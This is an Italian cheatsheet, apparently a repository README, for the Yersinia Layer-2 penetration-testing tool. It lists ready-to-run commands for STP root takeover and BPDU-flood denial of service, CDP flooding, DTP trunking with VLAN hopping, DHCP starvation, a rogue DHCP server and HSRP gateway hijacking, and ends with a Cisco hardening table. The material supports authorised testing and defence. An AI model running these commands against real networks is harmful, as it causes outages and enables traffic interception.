<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Cheatsheet di Yersinia

[Yersinia](https://github.com/tomac/yersinia) è un potente framework di test di penetrazione della rete Layer-2 (livello Data Link) progettato per analizzare e sfruttare i punti deboli dei protocolli Layer-2 come STP (Spanning Tree Protocol), CDP (Cisco Discovery Protocol), DTP (Dynamic Trunking Protocol), DHCP, HSRP e trunking VLAN 802.1Q.

---

## Sommario

- [Protocolli e modalità supportati](#supported-protocols--modes)
- [Installazione](#installazione)
- [Modalità maledizioni interattive (`-I`)](#modalità-maledizioni-interattive--i)
- [Attacchi STP (Spanning Tree Protocol)](#spanning-tree-protocol-stp-attacks)
- [Attacchi Cisco Discovery Protocol (CDP)](#cisco-discovery-protocol-cdp-attacks)
- [Dynamic Trunking Protocol (DTP) e hopping VLAN](#dynamic-trunking-protocol-dtp--vlan-hopping)
- [DHCP Rogue e attacchi di fame](#dhcp-rogue--starvation-attacks)
- [Dirottamento HSRP e VRRP](#hsrp--vrrp-dirottamento)
- [Mitigazione e rafforzamento](#mitigazione--rafforzamento)

---

## Protocolli e modalità supportati

Yersinia prende di mira i protocolli che operano al di sotto dell'IP:
- **STP:** Spanning Tree Protocol (acquisizione del ruolo del root bridge, notifiche di modifica della topologia).
- **CDP:** Cisco Discovery Protocol (inondazione del dispositivo, iniezione dei vicini falsi).
- **DTP:** Protocollo di trunking dinamico (negoziazione dei collegamenti trunk per accedere a tutte le VLAN).
- **DHCP:** Protocollo di configurazione host dinamico (server DHCP Starvation e non autorizzati).
- **HSRP:** Protocollo router Hot Standby (acquisizione del gateway attivo).
- **802.1Q / 802.1X:** hopping VLAN Dot1Q ed esaurimento EAPOL.
- **VTP:** Protocollo VLAN Trunking (cancellazione/sovrascrittura database VLAN).

Modalità di esecuzione:
- **`-I` (Interactive Curses):** Interfaccia utente del terminale a schermo intero per selezionare protocolli, configurare attacchi e monitorare pacchetti in tempo reale.
- **CLI non interattiva:** Esecuzione diretta per script automatizzati.

---

## Installazione
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y yersinia

# Arch Linux / BlackArch
sudo pacman -S yersinia

# Run in terminal
yersinia -h
```
---

## Modalità maledizioni interattive (`-I`)

Il modo più pratico e sicuro per utilizzare Yersinia nel terminale senza GUI:
```bash
sudo yersinia -I
```
- **`h`**: Visualizza la guida e le combinazioni di tasti.
- **`g`**: Cambia protocolli (STP, CDP, DTP, DHCP, HSRP, ecc.).
- **`x`**: Esegue il menu di attacco per il protocollo corrente.
- **`c`**: annulla l'attacco in corsa.
- **`l`**: attiva/disattiva la registrazione dei pacchetti.
- **`q`**: Esci da Yersinia.

---

## Attacchi STP (Spanning Tree Protocol).

STP elegge un root bridge con l'ID bridge più basso (Priorità + MAC). Yersinia può iniettare false BPDU (Bridge Protocol Data Units) per rivendicare lo stato di root e reindirizzare il traffico attraverso l'host dell'aggressore.

### 1. Rivendicare il ruolo di root (iniezione BPDU)
Invia BPDU con priorità `0` e un indirizzo MAC inferiore per diventare il Root Bridge STP:
```bash
sudo yersinia stp -attack 1 -i eth0
```
### 2. Rivendicare il ruolo root con modifica della topologia (TCN)
Forza tutti gli switch per svuotare le tabelle CAM e riconvertirle tramite l'attaccante:
```bash
sudo yersinia stp -attack 2 -i eth0
```
### 3. Attacco DoS STP (BPDU Flood Config)
Crash o saturazione della CPU dello switch con enormi frame BPDU in conflitto:
```bash
sudo yersinia stp -attack 0 -i eth0
```
---

## Attacchi Cisco Discovery Protocol (CDP).

CDP condivide nomi, modelli, funzionalità e versioni software dei dispositivi non autenticati sui dispositivi Cisco.

### 1. Inondazione di falsi vicini CDP
Memoria dell'interruttore di scarico e creazione di dispositivi fantasma in `show cdp neighbors`:
```bash
sudo yersinia cdp -attack 0 -i eth0
```
### 2. Cattura e ispeziona i pacchetti CDP legittimi
Esegui la modalità curses interattiva (`yersinia -I`), premi `g`, seleziona `CDP` e osserva il nome host dello switch, l'IP di gestione, il modello hardware e l'ID VLAN nativo.

---

## Protocollo DTP (Dynamic Trunking Protocol) e hopping VLAN

DTP negozia automaticamente i collegamenti trunking se le porte dello switch sono configurate in modalità `dynamic desirable` o `dynamic auto`.

### 1. Negoziare il collegamento trunking (pacchetto desiderabile DTP)
Inganna la porta dello switch trasformandola in un trunk 802.1Q:
```bash
sudo yersinia dtp -attack 0 -i eth0
```
Una volta negoziato il trunk, acquisisci frame da tutte le VLAN o tagga i pacchetti in sottoreti isolate utilizzando le interfacce Linux 802.1Q:
```bash
# Add VLAN subinterface for newly accessed VLAN (e.g. VLAN 20)
sudo ip link add link eth0 name eth0.20 type vlan id 20
sudo ip link set dev eth0.20 up
sudo dhclient eth0.20
```
---

## Attacchi DHCP canaglia e di fame

### 1. Attacco DHCP Starvation (pool IP di scarico)
Invia migliaia di richieste DHCP DISCOVER con indirizzi MAC casuali per consumare tutti gli indirizzi IP disponibili nel pool:
```bash
sudo yersinia dhcp -attack 1 -i eth0
```
### 2. Configurare un server DHCP non autorizzato
Distribuisci un server DHCP non autorizzato con DNS e gateway personalizzati:
```bash
sudo yersinia dhcp -attack 2 -i eth0
```
---

## Dirottamento HSRP e VRRP

HSRP consente a più router di presentare un unico gateway virtuale predefinito.

### 1. Richiedi la priorità del router attivo
Iniettare pacchetti HSRP HELLO con priorità 255 per assumere il controllo dell'IP del gateway predefinito:
```bash
sudo yersinia hsrp -attack 0 -i eth0
```
---

## Mitigazione e rafforzamento

| Protocollo | Attacco vettoriale | Mitigazione Cisco/Standard |
|---|---|---|
| **STP** | Iniezione del ponte della radice falsa | `spanning-tree bpduguard enable` sulle porte di accesso; `spanning-tree rootguard` sui collegamenti tra switch. |
| **DTP** | Negoziazione del tronco canaglia | `switchport mode access` e `switchport nonegotiate` su tutte le porte di accesso rivolte all'utente. |
| **CDP** | Inondazioni / Divulgazione di informazioni | `no cdp run` (a livello globale) o `no cdp enable` su porte di interfaccia non attendibili. |
| **DHCP** | Server fame e canaglia | Abilita `ip dhcp snooping`, limita la velocità per porta, configura le porte uplink affidabili. |
| **HSRP** | Dirottamento prioritario | Configura l'autenticazione MD5 con chiavi segrete (`standby 1 authentication md5 key-string <SECRET>`). |